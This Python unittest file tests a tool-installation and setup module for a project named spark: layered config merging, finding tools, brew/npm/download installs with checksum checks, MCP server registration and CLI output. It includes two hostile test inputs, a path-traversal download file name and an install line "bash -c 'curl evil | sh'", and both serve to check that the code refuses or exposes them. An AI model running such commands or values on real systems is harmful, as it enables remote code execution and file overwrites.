"""P82: the tools spark depends on, from one merged list (docs/2026-10-03-tools-design.md)."""

import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

import tools  # noqa: E402

DEFAULTS = {
    "roles": {"pdf-text": "pdftotext"},
    "contracts": {"pdf-text": "page-text"},
    "pdftotext": {"for": "reading a datasheet", "kind": "path", "exe": "pdftotext",
                  "meets": ["page-text"], "install": {"brew": "brew install poppler"}},
}


def layer(data):
    path = Path(tempfile.mkdtemp()) / "tools.json"
    path.write_text(data if isinstance(data, str) else json.dumps(data))
    return path


def project_with(data):
    root = Path(tempfile.mkdtemp())
    (root / ".spark").mkdir()
    (root / ".spark" / "tools.json").write_text(json.dumps(data))
    return root


class TheLayersMergeFieldByFieldTest(unittest.TestCase):
    def setUp(self):
        patcher = mock.patch.object(tools, "DEFAULTS", layer(DEFAULTS))
        patcher.start()
        self.addCleanup(patcher.stop)
        self.nobody = Path(tempfile.mkdtemp()) / "absent.json"

    def test_the_project_wins_one_field_and_inherits_the_rest(self):
        personal = layer({"pdftotext": {"install": {"brew": "brew install poppler-qt5"}}})
        project = project_with({"pdftotext": {"exe": "pdftotext-23"}})
        entry = tools.merged(project, personal)["tools"]["pdftotext"]
        self.assertEqual(entry["exe"], "pdftotext-23")
        self.assertEqual(entry["install"], {"brew": "brew install poppler-qt5"})
        self.assertEqual(entry["meets"], ["page-text"])

    def test_no_personal_file_is_simply_absent(self):
        self.assertIn("pdftotext", tools.merged(None, self.nobody)["tools"])
        self.assertFalse(self.nobody.exists(), "reading creates nothing")

    def test_a_tools_file_that_is_not_json_is_named(self):
        with self.assertRaises(tools.ToolProblem) as refused:
            tools.merged(None, layer("{not json"))
        self.assertIn("is not JSON", str(refused.exception))

    def test_a_tools_file_that_is_not_an_object_is_named(self):
        with self.assertRaises(tools.ToolProblem) as refused:
            tools.merged(None, layer("[1, 2]"))
        self.assertIn("a tools file is an object", str(refused.exception))

    def test_contracts_are_spark_s_to_state(self):
        personal = layer({"contracts": {"pdf-text": "anything"}})
        self.assertEqual(tools.merged(None, personal)["contracts"]["pdf-text"], "page-text")


class FindingAToolTest(unittest.TestCase):
    def setUp(self):
        patcher = mock.patch.object(tools, "DEFAULTS", layer(DEFAULTS))
        patcher.start()
        self.addCleanup(patcher.stop)
        self.nobody = Path(tempfile.mkdtemp()) / "absent.json"

    def test_a_role_leads_to_its_tool_and_its_command(self):
        with mock.patch.object(tools.shutil, "which", return_value="/opt/bin/pdftotext"):
            found = tools.find("pdf-text", None, self.nobody)
        self.assertEqual((found.name, found.role, found.command), ("pdftotext", "pdf-text", ["/opt/bin/pdftotext"]))

    def test_a_missing_tool_says_what_installs_it(self):
        with mock.patch.object(tools.shutil, "which", side_effect=lambda exe: "/usr/bin/brew" if exe == "brew" else None):
            with self.assertRaises(tools.ToolProblem) as missing:
                tools.find("pdf-text", None, self.nobody)
        said = str(missing.exception)
        self.assertIn("pdf-text (pdftotext) is not installed", said)
        self.assertIn("brew install poppler", said)
        self.assertNotIn("sudo", said)

    def test_a_tool_that_does_not_meet_the_role_s_contract_is_refused(self):
        personal = layer({"roles": {"pdf-text": "my-reader"},
                          "my-reader": {"kind": "path", "exe": "my-reader"}})
        with self.assertRaises(tools.ToolProblem) as refused:
            tools.find("pdf-text", None, personal)
        self.assertIn("my-reader does not say it meets 'page-text'", str(refused.exception))

    def test_a_tool_turned_off_in_the_project_says_how_to_turn_it_on(self):
        project = project_with({"pdftotext": {"on": False}})
        with self.assertRaises(tools.ToolProblem) as off:
            tools.find("pdf-text", project, self.nobody)
        self.assertIn("/spark:setup add pdftotext", str(off.exception))

    def test_an_entry_with_no_way_to_find_it_is_refused_by_name(self):
        personal = layer({"mystery": {"for": "something"}})
        with self.assertRaises(tools.ToolProblem) as refused:
            tools.find("mystery", None, personal)
        self.assertIn("no way to find it", str(refused.exception))

    def test_a_version_other_than_the_list_s_says_so_in_one_line(self):
        personal = layer({"pdftotext": {"version": "26.09.0"}})
        self.assertEqual(tools.version_note("pdftotext", "26.09.0", personal=personal), "")
        self.assertEqual(tools.version_note("pdftotext", "unknown version", personal=personal), "")
        self.assertIn("measured on pdftotext version 26.09.0", tools.version_note("pdftotext", "24.0", personal=personal))

    def test_a_missing_download_names_the_command_that_fetches_it(self):
        personal = layer({"mp": {"kind": "download", "file": "mp.bin", "url": "https://example.org/mp.bin",
                                 "sha256": "00", "install": {"download": "/spark:setup add mp"}}})
        with mock.patch.object(tools, "DOWNLOADS", Path(tempfile.mkdtemp())), \
                mock.patch.object(tools.shutil, "which", return_value=None):
            with self.assertRaises(tools.ToolProblem) as missing:
                tools.find("mp", None, personal)
        self.assertIn("install: /spark:setup add mp", str(missing.exception))

    def test_a_tool_whose_need_is_missing_names_the_need_and_its_install(self):
        # The cold run: tsci is `#!/usr/bin/env bun`, and on a machine without bun the build said only
        # "cannot build even a trivial board ... env: bun: No such file or directory" (2026-10-03).
        personal = layer({"tscircuit": {"kind": "npm", "exe": "tsci", "needs": ["bun"]},
                          "bun": {"kind": "path", "exe": "bun", "install": {"npm": "npm install -g bun"}}})
        with mock.patch.object(tools.shutil, "which", side_effect=lambda exe: None if exe == "bun" else "/usr/bin/" + exe):
            with self.assertRaises(tools.ToolProblem) as missing:
                tools.find("tscircuit", None, personal)
        self.assertIn("tscircuit needs bun", str(missing.exception))
        self.assertIn("npm install -g bun", str(missing.exception))

    def test_with_no_install_manager_here_the_line_still_says_what_to_get(self):
        # A Mac without Homebrew was told "see its entry in .../tools.json".
        with mock.patch.object(tools.shutil, "which", return_value=None):
            with self.assertRaises(tools.ToolProblem) as missing:
                tools.find("pdf-text", None, self.nobody)
        said = str(missing.exception)
        self.assertIn("brew install poppler", said)
        self.assertIn("Homebrew", said)
        self.assertNotIn("see its entry", said)

    def test_an_npm_tool_is_found_in_the_project_before_the_path(self):
        root = Path(tempfile.mkdtemp())
        (root / "node_modules" / ".bin").mkdir(parents=True)
        (root / "node_modules" / ".bin" / "tsci").write_text("#!/bin/sh\n")
        personal = layer({"tscircuit": {"kind": "npm", "exe": "tsci"}})
        with mock.patch.object(tools.shutil, "which", return_value="/global/tsci"):
            found = tools.find("tscircuit", root, personal)
        self.assertEqual(found.command, [str(root / "node_modules" / ".bin" / "tsci")])



def which_all_but(*absent):
    """A fake shutil.which: every program is in /usr/bin except the ones named."""
    return lambda exe: None if exe in absent else "/usr/bin/" + exe


class SetupTest(unittest.TestCase):
    """P82 task 6: the picture /spark:setup shows, one yes to install, and choices that write one line."""

    def setUp(self):
        defaults = dict(DEFAULTS, **{
            "roles": {"pdf-text": "pdftotext", "bench": "sigrok", "chip-docs": "docs", "simulator": "sim"},
            "pdftotext": dict(DEFAULTS["pdftotext"], install={"brew": "brew install poppler",
                                                              "apt": "sudo apt install poppler-utils"}),
            "sigrok": {"kind": "mcp", "on": False, "mcp": {"command": "sigrok-mcp-server"}, "needs": ["sigrok-cli"],
                       "needs_hardware": "the instrument plugged in"},
            "sigrok-cli": {"kind": "path", "exe": "sigrok-cli", "install": {"brew": "brew install sigrok-cli"}},
            "docs": {"kind": "mcp", "owner": "spark", "needs": ["node"]},
            "node": {"kind": "path", "exe": "node", "install": {"brew": "brew install node"}},
            "sim": {"kind": "path", "exe": "sim", "install": {"npm": "npm install -g sim"},
                    "needs_account": "a token in SIM_TOKEN", "account_env": "SIM_TOKEN"},
            "sim-mcp": {"kind": "mcp", "on": False, "mcp": {"command": "sim", "args": ["mcp"]}, "needs": ["sim"]},
            "mp": {"kind": "download", "file": "mp.bin", "url": "https://example.org/mp.bin",
                   "sha256": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",  # sha256 of b"foo"
                   "install": {"download": "/spark:setup add mp"}},
        })
        for name, value in (("DEFAULTS", layer(defaults)), ("DOWNLOADS", Path(tempfile.mkdtemp()) / "downloads")):
            patcher = mock.patch.object(tools, name, value)
            patcher.start()
            self.addCleanup(patcher.stop)
        self.personal = Path(tempfile.mkdtemp()) / "spark" / "tools.json"
        self.ran = []

    def run_fake(self, argv, **kw):
        self.ran.append(argv)

    def states(self, which, project=None, env=None):
        with mock.patch.object(tools.shutil, "which", side_effect=which), mock.patch.dict(tools.os.environ, env or {}, clear=False):
            return {label: state for state, label, _ in tools.status(project, self.personal) if state != "person"}

    def test_status_says_ok_missing_and_off(self):
        states = self.states(which_all_but("pdftotext"))
        self.assertEqual(states["pdf-text"], "missing")
        self.assertEqual(states["bench"], "off")

    def test_an_mcp_server_whose_need_is_missing_is_missing_not_ok(self):
        rows = [(state, text) for state, label, text in self.status_rows(which_all_but("node")) if label == "chip-docs"]
        self.assertEqual(rows[0][0], "missing")
        self.assertIn("brew install node", rows[0][1])

    def test_a_role_whose_tool_lacks_a_need_says_which_tool_needs_it(self):
        # The cold run's row read "bun (bun) is not installed" beside board-engine, without saying why.
        layer_ = layer({"pdftotext": {"needs": ["sigrok-cli"]}})
        with mock.patch.object(tools.shutil, "which", side_effect=which_all_but("sigrok-cli")):
            rows = [text for state, label, text in tools.status(None, layer_) if label == "pdf-text"]
        self.assertIn("pdftotext needs sigrok-cli", rows[0])

    def test_an_mcp_server_with_no_role_is_listed_too(self):
        self.assertIn("sim-mcp", self.states(which_all_but()))

    def status_rows(self, which):
        with mock.patch.object(tools.shutil, "which", side_effect=which):
            return tools.status(None, self.personal)

    def test_the_account_row_goes_once_its_variable_is_set(self):
        with mock.patch.dict(tools.os.environ, {}, clear=True):
            unset = [label for state, label, _ in self.status_rows(which_all_but()) if state == "person"]
        with mock.patch.dict(tools.os.environ, {"SIM_TOKEN": "x"}):
            set_ = [label for state, label, _ in self.status_rows(which_all_but()) if state == "person"]
        self.assertIn("simulator", unset)
        self.assertNotIn("simulator", set_)

    def test_install_runs_each_missing_tool_s_line_and_never_sudo(self):
        with mock.patch.object(tools.shutil, "which", side_effect=which_all_but("pdftotext")):
            tools.install(["pdftotext"], None, self.personal, run=self.run_fake)
        self.assertEqual(self.ran, [["brew", "install", "poppler"]])
        self.assertFalse(any("sudo" in part for argv in self.ran for part in argv))

    def test_a_line_that_needs_sudo_is_named_for_the_person_not_run(self):
        with mock.patch.object(tools.shutil, "which", side_effect=which_all_but("pdftotext", "brew")):
            with self.assertRaises(tools.ToolProblem) as told:
                tools.install(["pdftotext"], None, self.personal, run=self.run_fake)
        self.assertEqual(self.ran, [])
        self.assertIn("sudo apt install poppler-utils", str(told.exception))

    def test_a_tool_already_here_is_not_installed_again(self):
        with mock.patch.object(tools.shutil, "which", side_effect=which_all_but()):
            tools.install(["pdftotext"], None, self.personal, run=self.run_fake)
        self.assertEqual(self.ran, [])

    def test_a_download_lands_in_downloads_and_a_wrong_checksum_is_deleted(self):
        def curl(content):
            return lambda argv, **kw: (self.ran.append(argv), Path(argv[argv.index("-o") + 1]).write_bytes(content))
        tools.install(["mp"], None, self.personal, run=curl(b"foo"))
        self.assertTrue((tools.DOWNLOADS / "mp.bin").is_file())
        self.assertIn("https://example.org/mp.bin", self.ran[0])
        (tools.DOWNLOADS / "mp.bin").unlink()
        with self.assertRaises(tools.ToolProblem) as refused:
            tools.install(["mp"], None, self.personal, run=curl(b"not foo"))
        self.assertIn("checksum", str(refused.exception))
        self.assertFalse((tools.DOWNLOADS / "mp.bin").exists(), "a file with the wrong checksum is not left to be used")

    def test_a_server_s_needs_install_first_and_it_registers_at_user_scope(self):
        with mock.patch.object(tools.shutil, "which", side_effect=which_all_but("sigrok-cli")):
            tools.install(["sigrok"], None, self.personal, run=self.run_fake)
        self.assertEqual(self.ran, [["brew", "install", "sigrok-cli"],
                                    ["claude", "mcp", "add", "--scope", "user", "sigrok", "--", "sigrok-mcp-server"]])

    def test_a_project_s_server_registers_at_project_scope(self):
        project = project_with({})
        with mock.patch.object(tools.shutil, "which", side_effect=which_all_but()):
            tools.install(["sigrok"], project, self.personal, run=self.run_fake)
        self.assertEqual(self.ran[-1][:5], ["claude", "mcp", "add", "--scope", "project"])

    def test_a_server_run_by_a_listed_tool_is_registered_by_that_tool_s_path(self):
        # wokwi-cli installs to ~/.local/bin, often not on the PATH Claude Code starts (docs/mcp.md).
        with mock.patch.object(tools.shutil, "which", side_effect=lambda exe: "/opt/elsewhere/bin/sim" if exe == "sim" else "/usr/bin/" + exe):
            tools.install(["sim-mcp"], None, self.personal, run=self.run_fake)
        self.assertEqual(self.ran[-1][-2:], ["/opt/elsewhere/bin/sim", "mcp"])

    def test_turning_on_writes_one_field_and_creates_the_folder(self):
        tools.choose(["sigrok", "on"], True, self.personal)
        self.assertEqual(json.loads(self.personal.read_text()), {"sigrok": {"on": True}})

    def test_a_second_choice_keeps_the_first(self):
        tools.choose(["sigrok", "on"], True, self.personal)
        tools.choose(["roles", "simulator"], "sim", self.personal)
        self.assertEqual(json.loads(self.personal.read_text()), {"sigrok": {"on": True}, "roles": {"simulator": "sim"}})

    def test_use_refuses_a_tool_that_does_not_meet_the_contract(self):
        with self.assertRaises(tools.ToolProblem):
            tools.use("pdf-text", "mystery", None, self.personal)
        self.assertFalse(self.personal.exists(), "nothing written for a refused swap")

    def test_use_writes_the_role_when_the_tool_meets_it(self):
        layer_ = layer({"my-reader": {"kind": "path", "exe": "my-reader", "meets": ["page-text"]}})
        written = tools.use("pdf-text", "my-reader", None, layer_)
        self.assertEqual(json.loads(written.read_text())["roles"], {"pdf-text": "my-reader"})


class SetupCommandTest(unittest.TestCase):
    """tools.py's command line — what /spark:setup runs."""

    def setUp(self):
        defaults = dict(DEFAULTS, **{"roles": {"pdf-text": "pdftotext", "bench": "sigrok"},
                                     "sigrok": {"kind": "mcp", "on": False, "mcp": {"command": "sigrok-mcp-server"}}})
        self.personal = Path(tempfile.mkdtemp()) / "spark" / "tools.json"
        for name, value in (("DEFAULTS", layer(defaults)), ("PERSONAL", self.personal)):
            patcher = mock.patch.object(tools, name, value)
            patcher.start()
            self.addCleanup(patcher.stop)
        self.ran = []

    def cli(self, *argv, which=which_all_but()):
        import contextlib
        import io
        out = io.StringIO()
        with mock.patch.object(tools.shutil, "which", side_effect=which), contextlib.redirect_stdout(out), \
                contextlib.redirect_stderr(out):
            code = tools.main(list(argv), run=lambda argv, **kw: self.ran.append(argv))
        return code, out.getvalue()

    def test_status_marks_each_row_and_says_could_not_run_while_something_is_missing(self):
        code, said = self.cli("--status", which=which_all_but("pdftotext"))
        self.assertEqual(code, tools.EXIT_COULD_NOT_RUN)
        self.assertIn("[????] pdf-text", said)
        self.assertIn("[off ] bench", said)
        self.assertIn("1 to install: pdftotext", said)
        self.assertEqual(self.cli("--status")[0], tools.EXIT_OK)

    def test_on_writes_the_choice_and_registers_the_server(self):
        code, said = self.cli("--on", "sigrok")
        self.assertEqual(json.loads(self.personal.read_text()), {"sigrok": {"on": True}})
        self.assertIn(["claude", "mcp", "add", "--scope", "user", "sigrok", "--", "sigrok-mcp-server"], self.ran)
        self.assertIn("restart", said.lower())

    def test_off_writes_the_choice_and_unregisters_the_server(self):
        self.cli("--off", "sigrok")
        self.assertEqual(json.loads(self.personal.read_text()), {"sigrok": {"on": False}})
        self.assertIn(["claude", "mcp", "remove", "--scope", "user", "sigrok"], self.ran)

    def test_new_writes_a_person_s_own_tool_and_refuses_one_spark_could_not_find(self):
        code, _ = self.cli("--new", 'my-reader={"kind": "path", "exe": "my-reader", "meets": ["page-text"]}')
        self.assertEqual(code, tools.EXIT_OK)
        self.assertEqual(json.loads(self.personal.read_text())["my-reader"]["exe"], "my-reader")
        code, said = self.cli("--new", 'broken={"kind": "path"}')
        self.assertEqual(code, tools.EXIT_COULD_NOT_RUN)
        self.assertIn("exe", said)
        self.assertNotIn("broken", json.loads(self.personal.read_text()))

    def test_pin_and_use_write_into_the_project_when_one_is_named(self):
        project = project_with({})
        self.cli("--pin", "pdftotext=26.09.0", "--project", str(project))
        self.assertEqual(json.loads((project / ".spark" / "tools.json").read_text()), {"pdftotext": {"version": "26.09.0"}})
        self.assertFalse(self.personal.exists())


class AProjectNamedRelativelyTest(unittest.TestCase):
    def test_an_npm_tool_s_command_is_absolute_when_the_project_is_given_as_dot(self):
        # `tools.py --status --project .` printed node_modules/.bin/tsci, a command that only works from
        # the directory it was found in; check_spine runs the engine from a scratch directory.
        import os
        root = Path(tempfile.mkdtemp())
        (root / "node_modules" / ".bin").mkdir(parents=True)
        (root / "node_modules" / ".bin" / "tsci").write_text("#!/bin/sh\n")
        personal = layer({"tscircuit": {"kind": "npm", "exe": "tsci", "needs": []}})
        here = os.getcwd()
        os.chdir(root)
        try:
            with mock.patch.object(tools.shutil, "which", return_value=None):
                found = tools.find("tscircuit", Path("."), personal)
        finally:
            os.chdir(here)
        self.assertTrue(Path(found.command[0]).is_absolute(), found.command)


FOO_SHA256 = "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae"  # sha256 of b"foo"


def writes(content, ran):
    """A fake runner that records the command and writes `content` where curl was told to (-o)."""
    def run(argv, **kw):
        ran.append(argv)
        if "-o" in argv:
            Path(argv[argv.index("-o") + 1]).write_bytes(content)
    return run


class TheFinalReviewOfP82Test(unittest.TestCase):
    """Findings of the whole-branch review (2026-10-03), each reproduced here before it was fixed."""

    def setUp(self):
        defaults = dict(DEFAULTS, **{
            "roles": {"pdf-text": "pdftotext", "simulator": "sim", "board-engine": "tscircuit"},
            "contracts": {"pdf-text": "page-text"},
            "sim": {"kind": "path", "exe": "sim", "install": {"download": "/spark:setup"},
                    "fetch": {"file": "sim", "executable": True, "platforms": {
                        "macos-arm64": {"url": "https://example.org/sim-macos-arm64", "sha256": FOO_SHA256},
                        "linux-x64": {"url": "https://example.org/sim-linux-x64", "sha256": FOO_SHA256}}}},
            "mp": {"kind": "download", "file": "mp.bin", "url": "https://example.org/mp.bin", "sha256": FOO_SHA256},
            "tscircuit": {"kind": "npm", "exe": "tsci", "version": "0.1.1", "core": "0.0.1",
                          "packages": {"version": "@tscircuit/cli", "core": "tscircuit"},
                          "install": {"npm": "npm install --save-dev @tscircuit/cli@{version} tscircuit@{core}"}},
        })
        self.personal = Path(tempfile.mkdtemp()) / "spark" / "tools.json"
        for name, value in (("DEFAULTS", layer(defaults)), ("DOWNLOADS", Path(tempfile.mkdtemp()) / "downloads"),
                            ("PERSONAL", self.personal)):
            patcher = mock.patch.object(tools, name, value)
            patcher.start()
            self.addCleanup(patcher.stop)
        self.ran = []

    def cli(self, *argv, which=lambda exe: "/usr/bin/" + exe):
        import contextlib
        import io
        out = io.StringIO()
        with mock.patch.object(tools.shutil, "which", side_effect=which), contextlib.redirect_stdout(out), \
                contextlib.redirect_stderr(out):
            code = tools.main(list(argv), run=lambda argv, **kw: self.ran.append(argv))
        return code, out.getvalue()

    # C1 — `npm install -g wokwi-cli` was a 404: the simulator comes as a checked download per platform.
    def test_a_fetched_tool_is_this_platform_s_build_checked_and_executable(self):
        import os
        with mock.patch.object(tools, "platform_key", return_value="macos-arm64"), \
                mock.patch.object(tools.shutil, "which", return_value=None):
            tools.install(["sim"], None, self.personal, run=writes(b"foo", self.ran))
            found = tools.find("simulator", None, self.personal)
        self.assertIn("https://example.org/sim-macos-arm64", self.ran[0])
        self.assertEqual(found.command, [str(tools.DOWNLOADS / "sim")])
        self.assertTrue(os.access(found.command[0], os.X_OK), "a downloaded program must be executable")

    def test_no_build_for_this_platform_is_named(self):
        with mock.patch.object(tools, "platform_key", return_value="freebsd-x64"), \
                mock.patch.object(tools.shutil, "which", return_value=None):
            with self.assertRaises(tools.ToolProblem) as refused:
                tools.install(["sim"], None, self.personal, run=writes(b"foo", self.ran))
        self.assertIn("freebsd-x64", str(refused.exception))
        self.assertEqual(self.ran, [])

    # I7 — a project's file decides what is fetched and where; a download is checked before it is used.
    def test_a_download_s_file_must_be_a_plain_name(self):
        victim = Path(tempfile.mkdtemp()) / "keep.txt"
        victim.write_text("mine")
        layer_ = layer({"mp": {"file": "../../../../../../../../.." + str(victim)}})
        with self.assertRaises(tools.ToolProblem) as refused:
            tools.install(["mp"], None, layer_, run=writes(b"not foo", self.ran))
        self.assertIn("plain file name", str(refused.exception))
        self.assertEqual((self.ran, victim.read_text()), ([], "mine"))
        with self.assertRaises(tools.ToolProblem):
            tools.find("mp", None, layer_)

    def test_a_wrong_or_interrupted_download_leaves_nothing_spark_would_use(self):
        with self.assertRaises(tools.ToolProblem):
            tools.install(["mp"], None, self.personal, run=writes(b"not foo", self.ran))
        def interrupted(argv, **kw):
            Path(argv[argv.index("-o") + 1]).write_bytes(b"fo")
            raise tools.subprocess.CalledProcessError(18, argv)
        with self.assertRaises(tools.ToolProblem):
            tools.install(["mp"], None, self.personal, run=interrupted)
        self.assertEqual(sorted(p.name for p in tools.DOWNLOADS.iterdir()), [])

    def test_dry_run_shows_each_command_and_marks_what_a_project_s_file_set(self):
        project = project_with({"pdftotext": {"install": {"brew": "bash -c 'curl evil | sh'"}}})
        code, said = self.cli("--install", "pdftotext", "--dry-run", "--project", str(project),
                              which=lambda exe: None if exe == "pdftotext" else "/usr/bin/" + exe)
        self.assertEqual(self.ran, [], "a dry run runs nothing")
        self.assertIn("bash -c", said)
        self.assertIn("from .spark/tools.json", said)

    # I2 and the tracebacks the rule says never happen.
    def test_status_names_an_entry_it_cannot_use_instead_of_crashing(self):
        project = project_with({"roles": {"bench": "mystery"}, "mystery": {"for": "something"}})
        code, said = self.cli("--status", "--project", str(project))
        self.assertEqual(code, tools.EXIT_COULD_NOT_RUN)
        self.assertIn("mystery: no way to find it", said)

    def test_an_entry_of_any_kind_missing_what_it_needs_is_refused_by_name(self):
        for entry in ({"kind": "python"}, {"kind": "download", "url": "u", "sha256": "s"}, {"kind": "bundled"}):
            with self.assertRaises(tools.ToolProblem, msg=entry):
                tools.find("odd", None, layer({"odd": entry}))

    def test_a_needs_loop_an_unknown_placeholder_and_roles_that_are_not_an_object_are_sentences(self):
        loop = layer({"a": {"kind": "path", "exe": "a", "needs": ["b"]}, "b": {"kind": "path", "exe": "b", "needs": ["a"]}})
        with self.assertRaises(tools.ToolProblem) as looped:
            tools.find("a", None, loop)
        self.assertIn("loop", str(looped.exception))
        odd = layer({"pdftotext": {"install": {"brew": "brew install poppler@{release}"}}})
        with mock.patch.object(tools.shutil, "which", side_effect=lambda exe: None if exe == "pdftotext" else "/usr/bin/" + exe):
            with self.assertRaises(tools.ToolProblem) as placeholder:
                tools.find("pdf-text", None, odd)
        self.assertIn("{release}", str(placeholder.exception))
        with self.assertRaises(tools.ToolProblem):
            tools.merged(None, layer({"roles": ["pdf-text"]}))

    # I3 — turned off in the project, the advice must turn it on where it was turned off.
    def test_off_in_the_project_says_where_and_how_to_turn_it_on_there(self):
        project = project_with({"pdftotext": {"on": False}})
        with self.assertRaises(tools.ToolProblem) as off:
            tools.find("pdf-text", project, self.personal)
        self.assertIn("--project", str(off.exception))
        self.assertIn(".spark/tools.json", str(off.exception))

    def test_turning_on_in_the_person_s_file_what_the_project_turns_off_says_it_is_still_off(self):
        project = project_with({"pdftotext": {"on": False}})
        code, said = self.cli("--on", "pdftotext", "--project", str(project), "--personal")
        self.assertEqual(code, tools.EXIT_COULD_NOT_RUN)
        self.assertIn("still off", said)

    # I5 — a pin must reach what is installed.
    def npm_project(self, cli_version, core_version, pins):
        project = project_with({"tscircuit": pins} if pins else {})
        for package, version in (("@tscircuit/cli", cli_version), ("tscircuit", core_version)):
            folder = project / "node_modules" / package
            folder.mkdir(parents=True)
            (folder / "package.json").write_text(json.dumps({"name": package, "version": version}))
        (project / "node_modules" / ".bin").mkdir()
        (project / "node_modules" / ".bin" / "tsci").write_text("#!/bin/sh\n")
        return project

    def test_pin_can_name_the_field_it_pins(self):
        project = project_with({})
        self.cli("--pin", "tscircuit.core=0.0.2", "--project", str(project))
        self.assertEqual(json.loads((project / ".spark" / "tools.json").read_text()), {"tscircuit": {"core": "0.0.2"}})

    def test_status_notes_an_installed_version_other_than_the_pin(self):
        project = self.npm_project("0.1.1", "0.0.1", {"core": "0.0.2"})
        with mock.patch.object(tools.shutil, "which", return_value=None):
            rows = [text for state, label, text in tools.status(project, self.personal) if label == "board-engine"]
        self.assertIn("0.0.1", rows[0])
        self.assertIn("0.0.2", rows[0])

    def test_install_reinstalls_a_tool_whose_installed_version_is_not_the_pin(self):
        project = self.npm_project("0.1.1", "0.0.1", {"core": "0.0.2"})
        with mock.patch.object(tools.shutil, "which", side_effect=lambda exe: "/usr/bin/" + exe if exe == "npm" else None):
            tools.install(["tscircuit"], project, self.personal, run=self.run_fake)
        self.assertEqual(self.ran, [["npm", "install", "--save-dev", "@tscircuit/cli@0.1.1", "tscircuit@0.0.2"]])

    def test_an_installed_version_that_is_the_pin_is_left_alone(self):
        project = self.npm_project("0.1.1", "0.0.1", None)
        with mock.patch.object(tools.shutil, "which", side_effect=lambda exe: "/usr/bin/" + exe if exe == "npm" else None):
            tools.install(["tscircuit"], project, self.personal, run=self.run_fake)
        self.assertEqual(self.ran, [])

    def run_fake(self, argv, **kw):
        self.ran.append(argv)


class SparkSDefaultsHoldTogetherTest(unittest.TestCase):
    """The shipped data/tools.json, read as it is: every role names a tool that meets the role's contract."""

    def test_every_role_s_tool_exists_and_meets_its_contract(self):
        lists = tools.merged(None, Path(tempfile.mkdtemp()) / "absent.json")
        broken = [(role, name) for role, name in lists["roles"].items()
                  if name not in lists["tools"]
                  or (lists["contracts"].get(role) and lists["contracts"][role] not in (lists["tools"][name].get("meets") or []))]
        self.assertEqual(broken, [], "a role in spark's own defaults points at a tool that cannot do its job")

    def test_every_need_in_the_defaults_is_itself_a_tool_on_the_list(self):
        lists = tools.merged(None, Path(tempfile.mkdtemp()) / "absent.json")
        unknown = sorted({(name, need) for name, entry in lists["tools"].items()
                          for need in entry.get("needs") or [] if need not in lists["tools"]})
        self.assertEqual(unknown, [], "a need spark cannot find or install")

    def test_the_simulator_installs_as_a_checked_download_not_an_npm_package(self):
        # `npm install -g wokwi-cli` is a 404 (the final review, C1): wokwi-cli ships as release binaries.
        entry = tools.merged(None, Path(tempfile.mkdtemp()) / "absent.json")["tools"]["wokwi-cli"]
        self.assertNotIn("npm", entry.get("install") or {})
        platforms = entry["fetch"]["platforms"]
        self.assertEqual(sorted(platforms), ["linux-arm64", "linux-x64", "macos-arm64", "macos-x64"])
        for build in platforms.values():
            self.assertTrue(build["url"].startswith("https://github.com/wokwi/wokwi-cli/releases/download/v"), build)
            self.assertRegex(build["sha256"], "^[0-9a-f]{64}$")

    def test_the_board_engine_says_it_needs_bun(self):
        # tsci's launcher is `#!/usr/bin/env bun` (tscircuit's cli.mjs); the cold run proved it.
        self.assertIn("bun", tools.merged(None, Path(tempfile.mkdtemp()) / "absent.json")["tools"]["tscircuit"].get("needs") or [])

if __name__ == "__main__":
    unittest.main()
